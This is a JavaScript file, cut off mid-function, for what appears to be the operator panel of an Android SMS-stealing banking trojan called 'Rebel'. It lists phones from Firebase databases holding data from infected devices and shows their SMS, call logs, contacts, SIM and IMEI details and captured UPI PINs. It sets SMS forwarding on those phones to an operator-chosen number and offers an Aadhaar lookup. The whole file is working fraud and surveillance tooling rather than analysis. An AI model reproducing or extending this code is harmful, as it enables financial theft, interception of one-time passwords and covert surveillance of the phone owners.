var PANEL_BUILD=16;
var AUTH_URL='';
var SMS_TOKEN_URL='';
var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
var activeListeners={}, window_sms=[], window_banks=[];
var _smsLoadedDev='', _smsDataHash='', _smsRenderTimer=0, _bankDataHash='';
var _sendSimSlot=1, _deviceSims=[], _bankPrefetchDev='';
var ACTIVE_FB_KEY='rbl_active_fb_m';
var ACCESS_KEY_STORAGE='rbl_active_access_key';
var FB_LIST_PREFIX='rbl_fb_list_';
var FB_ACTIVE_PREFIX='rbl_fb_active_';
var CLIENTS_CACHE_PREFIX='rbl_clients_cache_';
var CLIENTS_CACHE_TTL=6*60*60*1000;
var tabLoaded={};
var _smsTokenLog=[];
var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
var SUMMARY_NODES=['devices_status','clients'];
var DEVICE_NODES=['devices','users','clients_list','online_devices'];

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function normAccessKey(key){return String(key||'').toUpperCase().replace(/[^A-Z0-9\-]/g,'');}
function getCurrentAccessKey(){
  try{
    if(window.RebelAndroid&&RebelAndroid.getAccessKey){
      var bridgeKey=RebelAndroid.getAccessKey();
      if(bridgeKey&&String(bridgeKey).length>3)return normAccessKey(bridgeKey);
    }
    var s=getSession();
    if(s&&s.key)return normAccessKey(s.key);
    return normAccessKey(localStorage.getItem(ACCESS_KEY_STORAGE)||'');
  }catch(e){return '';}
}
function clientsCacheKey(){var k=getCurrentAccessKey();return k?CLIENTS_CACHE_PREFIX+k:'rbl_clients_cache_v2';}
function maskAccessKey(key){
  key=normAccessKey(key);
  if(key.length<10)return key||'—';
  return key.slice(0,8)+'••••';
}
function firebaseListStorageKey(){var k=getCurrentAccessKey();return k?FB_LIST_PREFIX+k:'';}
function firebaseActiveStorageKey(){var k=getCurrentAccessKey();return k?FB_ACTIVE_PREFIX+k:ACTIVE_FB_KEY;}
function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}

/* ═══ ADVANCED FX ═══ */
function ripple(e,el){
  if(!el)return;var r=el.getBoundingClientRect(),s=Math.max(r.width,r.height);
  var p=document.createElement('span');p.className='ripple';
  p.style.width=p.style.height=s+'px';p.style.left=(e.clientX||r.left+r.width/2)-r.left-s/2+'px';
  p.style.top=(e.clientY||r.top+r.height/2)-r.top-s/2+'px';
  el.style.position=el.style.position||'relative';el.style.overflow='hidden';
  el.appendChild(p);setTimeout(function(){p.remove();},650);
}
function spawnConfetti(x,y,n){
  var layer=document.getElementById('fxLayer');if(!layer)return;
  var cols=['#ff3c3c','#ff9500','#00ff9d','#7b9cff','#fff'];
  for(var i=0;i<(n||36);i++){
    var c=document.createElement('i');c.className='confetti';
    c.style.left=(x+(Math.random()-.5)*80)+'px';c.style.top=y+'px';
    c.style.background=cols[i%cols.length];
    c.style.setProperty('--tx',(Math.random()-.5)*220+'px');
    c.style.setProperty('--ty',(80+Math.random()*160)+'px');
    c.style.setProperty('--rot',(Math.random()*720)+'deg');
    c.style.setProperty('--dur',(.9+Math.random()*.8)+'s');
    layer.appendChild(c);(function(node){setTimeout(function(){node.remove();},1800);})(c);
  }
}
function unlockFlash(){var f=document.createElement('div');f.className='unlock-flash';document.body.appendChild(f);setTimeout(function(){f.remove();},750);}
function setHdrSync(on){
  var d=document.getElementById('hdrLive');if(d)d.classList.toggle('syncing',!!on);
}
function showSkeleton(){
  var el=document.getElementById('devList');
  if(!el)return;el.innerHTML='<div class="skeleton">'+Array(5).fill('<div class="skel-card"></div>').join('')+'</div>';
}
function countUp(el,target){
  if(!el)return;var start=parseInt(el.textContent,10)||0;if(start===target)return;
  var t0=performance.now(),dur=420;
  function step(ts){
    var p=Math.min(1,(ts-t0)/dur);p=1-Math.pow(1-p,3);
    el.textContent=Math.round(start+(target-start)*p);
    if(p<1)requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}
function initParticles(){
  var c=document.getElementById('particleCanvas');if(!c)return;
  var ctx=c.getContext('2d'),pts=[],W,H,dpr=Math.min(window.devicePixelRatio||1,2);
  function resize(){W=c.width=innerWidth*dpr;H=c.height=innerHeight*dpr;c.style.width=innerWidth+'px';c.style.height=innerHeight+'px';}
  resize();window.addEventListener('resize',resize);
  for(var i=0;i<22;i++)pts.push({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-.5)*.25*dpr,vy:(Math.random()-.5)*.25*dpr,r:1+Math.random()*1.5*dpr,a:.12+Math.random()*.25});
  function frame(){
    ctx.clearRect(0,0,W,H);
    pts.forEach(function(p){
      p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=W;if(p.x>W)p.x=0;if(p.y<0)p.y=H;if(p.y>H)p.y=0;
      ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,6.28);ctx.fillStyle='rgba(255,80,80,'+p.a+')';ctx.fill();
    });
    for(var i=0;i<pts.length;i++)for(var j=i+1;j<pts.length;j++){
      var a=pts[i],b=pts[j],dx=a.x-b.x,dy=a.y-b.y,d=dx*dx+dy*dy;
      if(d<9000*dpr){ctx.strokeStyle='rgba(255,149,0,'+(0.08*(1-d/(9000*dpr)))+')';ctx.lineWidth=.6*dpr;ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.stroke();}
    }
    requestAnimationFrame(frame);
  }
  frame();
}
function initParallax(){/* flat UI — no 3D tilt */}
function initScrollPerf(){
  var t;
  function onScroll(){
    document.body.classList.add('is-scrolling');
    clearTimeout(t);
    t=setTimeout(function(){document.body.classList.remove('is-scrolling');},180);
  }
  document.querySelectorAll('.screen,.side-menu-scroll').forEach(function(el){
    el.addEventListener('scroll',onScroll,{passive:true});
  });
}
var _navGlowEl=null;
function moveNavGlow(btn){
  if(!btn)return;if(!_navGlowEl){_navGlowEl=document.createElement('div');_navGlowEl.className='nav-glow';
    var nav=document.getElementById('bottomNav');if(nav)nav.insertBefore(_navGlowEl,nav.firstChild);}
  var r=btn.getBoundingClientRect(),nr=btn.parentNode.getBoundingClientRect();
  _navGlowEl.style.left=(r.left-nr.left+4)+'px';_navGlowEl.style.width=(r.width-8)+'px';
}
function bindRipples(){
  document.querySelectorAll('.nav-item,.btn-primary,.btn-send,.icon-btn,.menu-item').forEach(function(el){
    el.addEventListener('click',function(e){ripple(e,el);});
  });
}
function makeDevKey(fbId,devId){return fbId+'::'+devId;}
function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
function getFilteredDevs(){return activeFbId?allDevs.filter(function(d){return d.fbId===activeFbId;}):allDevs;}
function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}

function loadFirebaseConfigs(){
  var storageKey=firebaseListStorageKey();
  var seed=(typeof REBEL_DEFAULT_FIREBASES!=='undefined'&&REBEL_DEFAULT_FIREBASES.length)?REBEL_DEFAULT_FIREBASES:[];
  if(!storageKey)return seed.slice();
  try{
    var s=localStorage.getItem(storageKey);
    if(s){
      var p=JSON.parse(s);
      if(Array.isArray(p)&&p.length){
        seed.forEach(function(def){
          if(!p.some(function(c){return c.id===def.id||normalizeFirebaseUrl(c.databaseURL)===normalizeFirebaseUrl(def.databaseURL);}))p.push(def);
        });
        p.forEach(function(c){
          if(!c.schema)c.schema=(c.databaseURL||'').indexOf('rabel-raand')>=0?'rabel':'spinplay';
          if(c.id==='rabel_raand'||(c.databaseURL||'').indexOf('rabel-raand')>=0)c.name='Rebel';
        });
        return p;
      }
    }
  }catch(e){}
  return seed.slice();
}
function saveFirebaseConfigs(){
  var storageKey=firebaseListStorageKey();
  if(!storageKey)return;
  try{localStorage.setItem(storageKey,JSON.stringify(firebaseConfigs));}catch(e){}
}
function initFirebaseInstance(cfg){
  var appName='mfb_'+cfg.id,db=null;
  if(cfg.apiKey){
    try{
      var exists=false;firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
      if(!exists)firebase.initializeApp({apiKey:cfg.apiKey,authDomain:cfg.authDomain||'',databaseURL:cfg.databaseURL,projectId:cfg.projectId||cfg.id,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''},appName);
      db=firebase.app(appName).database();
    }catch(e){}
  }
  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
  firebaseInstances.push(inst);return inst;
}
function initFirebase(){
  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
  firebaseConfigs.forEach(initFirebaseInstance);
  try{activeFbId=localStorage.getItem(firebaseActiveStorageKey())||'';}catch(e){activeFbId='';}
  if(!activeFbId&&firebaseConfigs.length)activeFbId=firebaseConfigs[0].id;
  updateFbUi();
  updateAccessKeyBadge();
}
function bindAccessKey(key){
  key=normAccessKey(key);
  if(!key)return;
  try{localStorage.setItem(ACCESS_KEY_STORAGE,key);}catch(e){}
  clearListeners();
  selDev='';
  tabLoaded={};
  clientsRawMap={};
  window_sms=[];
  window_banks=[];
  _smsLoadedDev='';
  _smsDataHash='';
  reloadFirebaseForAccessKey();
}
function reloadFirebaseForAccessKey(){
  initFirebase();
  if(panelReady)fetchAllData();
}
function updateAccessKeyBadge(){
  var el=document.getElementById('accessKeyBadge');
  if(!el)return;
  var k=getCurrentAccessKey();
  el.textContent=k?('Key: '+maskAccessKey(k)):'No access key';
}

function updateFbUi(){
  var inst=getFbInstance(activeFbId);
  var name=inst?inst.name:'—';
  var chip=document.getElementById('fbChip');if(chip)chip.textContent=name;
  var moreFb=document.getElementById('moreFbName');if(moreFb)moreFb.textContent=name;
  document.getElementById('hdrSub').textContent=inst?(getFilteredDevs().length+' devices · '+name):'No Firebase';
  var html=firebaseConfigs.map(function(c){
    var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
    return '<div class="fb-option'+(c.id===activeFbId?' active':'')+'" onclick="switchFirebase(\''+c.id+'\')"><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices</div></div>';
  }).join('');
  document.getElementById('fbSheetList').innerHTML=html;
}
function switchFirebase(id){
  if(!getFbInstance(id))return;
  activeFbId=id;try{localStorage.setItem(firebaseActiveStorageKey(),id);}catch(e){}
  if(selDev){var d=getSelDev();if(!d||d.fbId!==id){selDev='';clearListeners();}}
  updateFbUi();renderDevices();renderDeviceView();renderSms();updateSendForm();
  closeFbSheet();toast('Switched to '+getFbInstance(id).name,true);
}
function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}
function normalizeFirebaseUrl(raw){
  if(!raw)return '';
  var u=String(raw).trim().replace(/['"`<>]/g,'').replace(/[.,;]+$/,'');
  u=u.replace(/\.json(\?.*)?$/i,'').replace(/\/+$/,'');
  if(!/^https?:\/\//i.test(u)&&u.indexOf('.')>0)u='https://'+u;
  if(!/firebaseio\.com|firebasedatabase\.app/i.test(u))return '';
  return u.replace(/\/(clients|devices|messages|\.json).*$/i,'');
}
function projectIdFromUrl(url){
  var m=String(url||'').match(/\/\/([a-z0-9-]+?)(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/i);
  return m?m[1]:'';
}
function parseFirebaseFromText(text){
  if(!text)return null;
  var out={},t=String(text);
  var urlM=t.match(/https?:\/\/[a-zA-Z0-9_.-]+\.(?:firebaseio\.com|firebasedatabase\.app)[^\s"'`,;)<>]*/i);
  if(!urlM)urlM=t.match(/[a-zA-Z0-9_.-]+\.(?:firebaseio\.com|firebasedatabase\.app)[^\s"'`,;)<>]*/i);
  if(urlM)out.databaseURL=normalizeFirebaseUrl(urlM[0]);
  var apiM=t.match(/apiKey\s*[:=]\s*["']?(AIza[A-Za-z0-9_-]{20,})/i)||t.match(/\b(AIza[A-Za-z0-9_-]{20,})\b/);
  if(apiM)out.apiKey=(apiM[1]||apiM[0]).trim();
  var nameM=t.match(/(?:name|project\s*name)\s*[:=]\s*["']?([^"'\n,]+)/i);
  if(nameM)out.name=nameM[1].trim();
  var projM=t.match(/projectId\s*[:=]\s*["']?([a-zA-Z0-9_-]+)/i);
  if(projM)out.projectId=projM[1];
  if(out.databaseURL){
    if(!out.projectId)out.projectId=projectIdFromUrl(out.databaseURL);
    if(!out.authDomain&&out.projectId)out.authDomain=out.projectId+'.firebaseapp.com';
  }
  return out.databaseURL?out:null;
}
function detectFbSchema(url,roots){
  if((url||'').indexOf('rabel-raand')>=0)return 'rabel';
  if(roots&&typeof roots==='object'){
    var n=Object.keys(roots);
    if(n.indexOf('clients')>=0&&n.indexOf('messages')>=0)return 'rabel';
    if(n.indexOf('devices')>=0)return 'spinplay';
  }
  return 'spinplay';
}
function testFirebaseRoots(url){
  var base=String(url||'').replace(/\/+$/,'').replace(/\.json(\?.*)?$/i,'');
  return fetch(base+'/.json?shallow=true',{cache:'no-store'}).then(function(r){
    return r.json().then(function(data){
      if(data&&data.error)throw new Error(String(data.error));
      if(!r.ok)throw new Error('Firebase not reachable (HTTP '+r.status+')');
      return data;
    });
  });
}
function makeFbId(name){return String(name||'fb').toLowerCase().replace(/[^a-z0-9]+/g,'_').slice(0,20)+'_'+Date.now().toString(36);}
function addFirebaseFromConfig(cfg){
  if(!getCurrentAccessKey())return Promise.reject(new Error('Login with your access key first'));
  var url=normalizeFirebaseUrl(cfg.databaseURL||'');
  if(!url)return Promise.reject(new Error('Valid Firebase database URL required'));
  var existing=firebaseConfigs.find(function(c){return normalizeFirebaseUrl(c.databaseURL)===url;});
  if(existing){switchFirebase(existing.id);return Promise.resolve({ok:true,already:true,name:existing.name,id:existing.id});}
  return testFirebaseRoots(url).then(function(roots){
    if(!roots||typeof roots!=='object')throw new Error('Firebase returned empty data');
    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
    if(!nodes.length)throw new Error('No device nodes found in this Firebase');
    var schema=cfg.schema||detectFbSchema(url,roots);
    var name=cfg.name||projectIdFromUrl(url)||'Firebase Project';
    var pid=cfg.projectId||projectIdFromUrl(url)||makeFbId(name);
    var id=cfg.id||pid;
    if(firebaseConfigs.some(function(c){return c.id===id;}))id=makeFbId(name);
    var fullCfg={id:id,name:name,databaseURL:url,apiKey:cfg.apiKey||'',authDomain:cfg.authDomain||(pid+'.firebaseapp.com'),projectId:pid,schema:schema,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''};
    firebaseConfigs.push(fullCfg);
    saveFirebaseConfigs();
    initFirebaseInstance(fullCfg);
    switchFirebase(fullCfg.id);
    if(panelReady)fetchAllData();
    toast('Firebase connected: '+name,true);
    renderFirebaseManagerList();
    return {ok:true,name:name,nodes:nodes,id:fullCfg.id};
  });
}
function removeFirebaseProject(id){
  if(!confirm('Remove this Firebase project from your key?'))return;
  firebaseConfigs=firebaseConfigs.filter(function(c){return c.id!==id;});
  saveFirebaseConfigs();
  Object.keys(clientsRawMap).forEach(function(k){if(k.indexOf(id+'::')===0)delete clientsRawMap[k];});
  clearListeners();
  initFirebase();
  if(panelReady)fetchAllData();
  renderFirebaseManagerList();
  toast('Firebase removed',true);
}
function openFirebaseManager(){
  if(!getCurrentAccessKey()){toast('Login with your access key first',false);return;}
  renderFirebaseManagerList();
  document.getElementById('firebaseModal').classList.remove('hidden');
}
function closeFirebaseModal(e){
  if(e&&e.target!==document.getElementById('firebaseModal'))return;
  document.getElementById('firebaseModal').classList.add('hidden');
}
function renderFirebaseManagerList(){
  var el=document.getElementById('fbManagerList');
  if(!el)return;
  if(!firebaseConfigs.length){
    el.innerHTML='<div class="fb-empty">No Firebase projects for this key yet.</div>';
    return;
  }
  el.innerHTML=firebaseConfigs.map(function(cfg){
    var inst=getFbInstance(cfg.id);
    var cnt=allDevs.filter(function(d){return d.fbId===cfg.id;}).length;
    return '<div class="fb-manage-item"><div><div class="fb-manage-name">'+esc(cfg.name)+'</div><div class="fb-manage-meta">'+cnt+' devices · '+esc(cfg.schema||'auto')+'</div></div><button type="button" class="fb-manage-del" data-fb-id="'+esc(cfg.id)+'" onclick="removeFirebaseProject(this.getAttribute(\'data-fb-id\'))">Remove</button></div>';
  }).join('');
}
function submitFirebasePaste(){
  var raw=document.getElementById('fbPasteInput');
  if(!raw)return;
  var parsed=parseFirebaseFromText(raw.value||'');
  if(!parsed){toast('Paste a valid Firebase URL or config JSON',false);return;}
  addFirebaseFromConfig(parsed).then(function(){
    raw.value='';
  }).catch(function(err){toast(err.message||'Failed to connect Firebase',false);});
}

function getPhoneFromRecord(s){
  if(!s)return'';
  if(s.mobNo)return String(s.mobNo).trim();
  if(s.sims&&s.sims.length)for(var i=0;i<s.sims.length;i++){var p=s.sims[i]&&(s.sims[i].phoneNumber||s.sims[i].number);if(p)return String(p).trim();}
  return String(s.phone_number||s.phone||s.mobile||'').trim();
}
function resolveOnlineStatus(s,fbId){
  var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
  if(schema==='rabel')return s.status===true||s.online===true;
  if(s.online_status===true)return true;if(s.online_status===false)return false;
  return s.online===true||s.status==='online'||s.status===true;
}
function normalizeClientRecord(raw){
  if(!raw||typeof raw!=='object')return null;
  if(raw.password||raw.Pass)return null;
  if(raw.modelName||raw.deviceId||raw.mobNo)return{
    name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||'',
    online:raw.status===true,battery:parseInt(raw.battery,10)||0,
    network:raw.service_provider||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
  };
  return{name:raw.name||raw.device_model||'Unknown',brand:raw.brand||'',android:raw.android||'',
    online_status:raw.online_status,online:raw.online,status:raw.status,
    battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
    sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)};
}
function ingestDeviceData(fbId,node,devId,data){
  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
  norm._node=node;norm._fbId=fbId;
  clientsRawMap[makeDevKey(fbId,devId)]=Object.assign({},clientsRawMap[makeDevKey(fbId,devId)]||{},norm);
}
function mergeSummaryNode(fbId,node,raw){
  if(!raw||typeof raw!=='object')return;
  Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
}
function processClientsData(){
  allDevs=[];
  var raw={};Object.keys(clientsRawMap).forEach(function(k){if(!activeFbId||k.indexOf(activeFbId+'::')===0)raw[k]=clientsRawMap[k];});
  Object.keys(raw).forEach(function(k){
    var s=raw[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
    var on=resolveOnlineStatus(s,p.fbId);
    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
      name:s.name||'Unknown',displayPhone:getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0});
  });
  allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
  var prevSel=selDev;
  if(!selDev&&allDevs.length)selDev=allDevs[0].id;
  if(selDev&&selDev!==prevSel){
    _bankDataHash='';
    _bankPrefetchDev='';
    loadSmsForDevice(true);
  }
  renderDevices();updateStats();updateFbUi();
  saveClientsCache();
}
function getUpiPinFromRecord(s){
  if(!s)return'';
  var v=s.upipin!=null?s.upipin:(s.upi_pin!=null?s.upi_pin:(s.upiPin!=null?s.upiPin:s.UPI_PIN));
  return v!=null&&String(v).trim()!==''?String(v).trim():'';
}
function resolveLastSeenMs(raw,isOnline){
  if(isOnline)return Date.now();
  var keys=['last_seen','lastSeen','last_ping','lastPing','updated_at','updatedAt','timestamp','ts'];
  for(var i=0;i<keys.length;i++){
    var v=raw[keys[i]];
    if(v==null)continue;
    if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;
    if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
  }
  return 0;
}
function formatLastSeenAgo(ms){
  if(!ms)return'—';
  var sec=Math.max(0,Math.floor((Date.now()-ms)/1000));
  if(sec<60)return sec+'s ago';
  if(sec<3600)return Math.floor(sec/60)+'m ago';
  if(sec<86400)return Math.floor(sec/3600)+'h ago';
  return Math.floor(sec/86400)+'d ago';
}
function getClientsCacheMeta(){
  try{return JSON.parse(localStorage.getItem(clientsCacheKey())||'null');}catch(e){return null;}
}
function loadClientsCache(){
  var meta=getClientsCacheMeta();
  if(!meta||!meta.byFb)return false;
  var loaded=false;
  firebaseConfigs.forEach(function(cfg){
    var entry=meta.byFb[cfg.id];
    if(!entry||!entry.data||(Date.now()-entry.ts)>=CLIENTS_CACHE_TTL)return;
    Object.keys(entry.data).forEach(function(k){clientsRawMap[k]=entry.data[k];});
    loaded=true;
  });
  if(loaded)processClientsData();
  return loaded;
}
function saveClientsCache(){
  if(!activeFbId)return;
  var slice={};
  Object.keys(clientsRawMap).forEach(function(k){
    if(k.indexOf(activeFbId+'::')===0)slice[k]=clientsRawMap[k];
  });
  if(!Object.keys(slice).length)return;
  try{
    var meta=getClientsCacheMeta()||{byFb:{}};
    if(!meta.byFb)meta.byFb={};
    meta.byFb[activeFbId]={ts:Date.now(),data:slice};
    localStorage.setItem(clientsCacheKey(),JSON.stringify(meta));
  }catch(e){}
}
function panelApiFetch(body){
  return new Promise(function(resolve){
    if(window.RebelAndroid&&RebelAndroid.panelApi){
      try{
        var raw=RebelAndroid.panelApi(JSON.stringify(body));
        resolve(parseJson(raw)||{ok:false});
      }catch(e){resolve({ok:false,error:'API error'});}
      return;
    }
    resolve({ok:false,error:'Not in APK'});
  });
}
function switchDevTab(name,btn){
  document.querySelectorAll('.dev-tab').forEach(function(b){b.classList.remove('active');});
  if(btn)btn.classList.add('active');
  document.querySelectorAll('.dev-section').forEach(function(s){s.classList.remove('active');});
  var el=document.getElementById('devtab-'+name);
  if(el)el.classList.add('active');
  ensureDevTabLoaded(name);
}
function devOn(fbId,path,cb){
  var inst=getFbInstance(fbId);
  if(!inst||!inst.db)return;
  var handler=function(snap){cb(snap);};
  var key=fbId+'::'+path;
  activeListeners[key]={db:inst.db,ref:inst.db.ref(path),h:handler};
  inst.db.ref(path).on('value',handler);
}
function restPollExt(fbId,path,cb,ms){
  var inst=getFbInstance(fbId);
  if(!inst)return;
  var tick=function(){restJson(inst.restUrl+'/'+path+'.json').then(cb);};
  tick();
  activeListeners[fbId+'::rest::'+path]={timer:setInterval(tick,ms||8000)};
}
function setDevTabEmpty(tab,msg){
  var map={calls:'callsList',contacts:'contactsList',sim:'simList',perms:'permsList',forward:'fwList'};
  var el=document.getElementById(map[tab]);
  if(el)el.innerHTML='<div class="empty-mini">'+esc(msg)+'</div>';
}
function loadRabelSim(dev){
  restPollExt(dev.fbId,'clients/'+dev.rawId,function(data){
    var el=document.getElementById('simList');
    if(!data){el.innerHTML='<div class="empty-mini">No device info</div>';return;}
    var pin=getUpiPinFromRecord(data);
    var upiEl=document.getElementById('heroUpi');
    if(upiEl)upiEl.textContent=pin||'—';
    var fields=[['Model',data.modelName],['Mobile',data.mobNo],['Battery',data.battery],['Network',data.service_provider],['Storage',data.storage],['IP',data.ip_address],['Android',data.androidV],['UPI PIN',pin||'N/A']];
    if(data.sims&&data.sims.length)data.sims.forEach(function(sim,i){
      fields.push(['SIM '+(i+1),sim.carrierName+' · '+(sim.phoneNumber||'')]);
    });
    el.innerHTML=fields.map(function(f){
      return '<div class="data-row"><span class="data-lbl">'+f[0]+'</span><span class="data-val">'+esc(String(f[1]||'N/A'))+'</span></div>';
    }).join('');
  },8000);
}
function ensureDevTabLoaded(tab){
  if(!selDev||tabLoaded[tab])return;
  tabLoaded[tab]=true;
  var dev=getSelDev();
  if(!dev)return;
  var inst=getFbInstance(dev.fbId);
  if(inst&&inst.schema==='rabel'){
    if(tab==='sim'){loadRabelSim(dev);return;}
    if(tab==='calls'||tab==='contacts'||tab==='perms'||tab==='forward'){
      setDevTabEmpty(tab,'Not available for rabel schema');
      return;
    }
  }
  var ref=(dev.deviceNode||'devices')+'/'+dev.rawId;
  if(tab==='calls'){
    var loadCalls=function(d){
      var el=document.getElementById('callsList');
      if(!d||!d.calls){el.innerHTML='<div class="empty-mini">No call data</div>';return;}
      el.innerHTML=d.calls.map(function(c,i){
        return '<div class="data-row"><span class="data-idx">'+(i+1)+'</span><div><b>'+esc(c.number||'?')+'</b><div class="data-sub">'+esc(c.contact_name||'—')+' · '+esc(c.date_readable||'—')+' · '+esc(c.duration||'0')+'s</div></div><span class="chip">'+esc(c.type||'?')+'</span></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/all_calls',function(s){loadCalls(s.val());});
    else restPollExt(dev.fbId,ref+'/all_calls',loadCalls,10000);
  }else if(tab==='contacts'){
    var loadContacts=function(d){
      var el=document.getElementById('contactsList');
      if(!d||!d.contacts){el.innerHTML='<div class="empty-mini">No contacts</div>';return;}
      el.innerHTML=d.contacts.map(function(c,i){
        return '<div class="data-row"><span class="data-idx">'+(i+1)+'</span><div><b>'+esc(c.name||'No Name')+'</b><div class="data-sub mono">'+esc(c.phone||'—')+'</div></div></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/all_contacts',function(s){loadContacts(s.val());});
    else restPollExt(dev.fbId,ref+'/all_contacts',loadContacts,12000);
  }else if(tab==='sim'){
    var loadSim=function(s){
      var el=document.getElementById('simList');
      if(!s){el.innerHTML='<div class="empty-mini">No SIM info</div>';return;}
      var fields=[['Operator',s.sim_operator_name],['Network',s.network_operator_name],['IMEI',s.imei],['Subscriber',s.subscriber_id]];
      el.innerHTML=fields.map(function(f){
        return '<div class="data-row"><span class="data-lbl">'+f[0]+'</span><span class="data-val">'+esc(f[1]||'N/A')+'</span></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/device_info/sim_info',function(s){loadSim(s.val());});
    else restPollExt(dev.fbId,ref+'/device_info/sim_info',loadSim,12000);
  }else if(tab==='perms'){
    var loadPerms=function(p){
      var el=document.getElementById('permsList');
      if(!p){el.innerHTML='<div class="empty-mini">No permissions data</div>';return;}
      el.innerHTML=Object.keys(p).map(function(k){
        return '<div class="data-row"><span class="data-lbl">'+esc(k.replace(/_/g,' '))+'</span><span class="chip '+(p[k]?'on':'off')+'">'+(p[k]?'OK':'Denied')+'</span></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/live_data/permissions',function(s){loadPerms(s.val());});
    else restPollExt(dev.fbId,ref+'/live_data/permissions',loadPerms,15000);
  }else if(tab==='forward'){
    if(inst&&inst.db){
      devOn(dev.fbId,ref+'/forwarding_settings',function(s){
        var v=s.val()||{};
        var ft=document.getElementById('fwToggle');if(ft)ft.checked=!!v.enabled;
        var fn=document.getElementById('fwNumber');if(fn)fn.value=v.forward_to||'';
        var fa=document.getElementById('fwAll');if(fa)fa.checked=v.forward_all!==false;
        var ff=document.getElementById('fwFilters');if(ff)ff.value=(v.filters&&v.filters.join)?v.filters.join(', '):'';
      });
      devOn(dev.fbId,ref+'/forwarded_sms',function(s){
        var el=document.getElementById('fwList');
        if(!s.exists()){el.innerHTML='<div class="empty-mini">No forwarded SMS yet</div>';return;}
        var l=[];s.forEach(function(c){l.push(c.val());});
        l.reverse();
        el.innerHTML=l.slice(0,20).map(function(r){
          return '<div class="data-row"><div><b>'+esc(r.from||'?')+'</b> → '+esc(r.to||'?')+'<div class="data-sub">'+esc(r.body||'—')+'</div></div></div>';
        }).join('');
      });
    }
  }
}
function saveForward(){
  var dev=getSelDev();if(!dev){toast('Select device',false);return;}
  var inst=getFbInstance(dev.fbId);if(!inst){toast('No Firebase',false);return;}
  var ref=(dev.deviceNode||'devices')+'/'+dev.rawId+'/forwarding_settings';
  var filters=(document.getElementById('fwFilters').value||'').split(',').map(function(f){return f.trim();}).filter(Boolean);
  var payload={enabled:!!document.getElementById('fwToggle').checked,forward_to:(document.getElementById('fwNumber').value||'').trim(),forward_all:!!document.getElementById('fwAll').checked,filters:filters,updated_at:Date.now()};
  fetch(inst.restUrl+'/'+ref+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
    toast(r.ok?'Forwarding saved':'Save failed',r.ok);
  }).catch(function(){toast('Save failed',false);});
}
function openAadhar(){document.getElementById('aadharModal').classList.remove('hidden');}
function closeAadhar(e){if(e&&e.target&&e.target.id!=='aadharModal')return;document.getElementById('aadharModal').classList.add('hidden');}
function lookupAadhar(){
  var num=(document.getElementById('aadharNum').value||'').replace(/\D/g,'');
  var st=document.getElementById('aadharStatus'),res=document.getElementById('aadharResult');
  if(num.length<10){st.textContent='Enter valid 10-digit number';st.style.color='var(--error)';return;}
  st.textContent='Looking up...';st.style.color='var(--muted)';res.innerHTML='';
  panelApiFetch({type:'aadhar',num:num}).then(function(d){
